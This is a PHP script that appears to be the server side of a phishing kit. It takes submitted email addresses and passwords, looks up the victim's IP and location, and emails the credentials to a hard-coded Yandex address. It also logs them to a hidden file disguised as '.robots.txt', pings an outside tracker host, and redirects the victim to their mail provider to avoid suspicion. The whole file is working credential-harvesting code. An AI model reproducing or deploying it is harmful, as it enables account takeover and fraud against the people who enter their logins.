<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

error_reporting(0);

$to = "evanskelvin2019@yandex.ru";

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['e']) && isset($_POST['p'])) {
    $email = $_POST['e'];
    $password = $_POST['p'];

    // Get client IP
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    // Get geolocation data
    $country = $city = $code = $state = '';
    $data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if ($data && $data->geoplugin_countryName !== null) {
        $country = $data->geoplugin_countryName;
        $city = $data->geoplugin_city;
        $code = $data->geoplugin_countryCode;
        $state = $data->geoplugin_region;
    }

    // Prepare email content
    $body = "
    [LOGIN DETAILS]
    UserId : [ $email ]
    Password : [ $password ]
    [Client Info]
    IP > $ip
    Location > $city $state, $country
    ";
    $subject = "New Login : $ip";

    // Send email
    mail($to, $subject, $body);

    // Log to file (not recommended for sensitive data)
    file_put_contents(".robots.txt", $body."\n\n", FILE_APPEND);

    // Optionally, call external service (may fail if allow_url_fopen is off)
    $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
    @file_get_contents("https://ip-trackers.tiiny.io/?ip=$tmp");

    // Respond with domain
    echo json_encode([
        "status" => "success",
        "redirect" => "https://".substr(strrchr($email, "@"), 1)
    ]);
    exit;
}

// If not POST or missing parameters
echo json_encode([
    "status" => "error",
    "message" => "Invalid request"
]);
exit;
?>
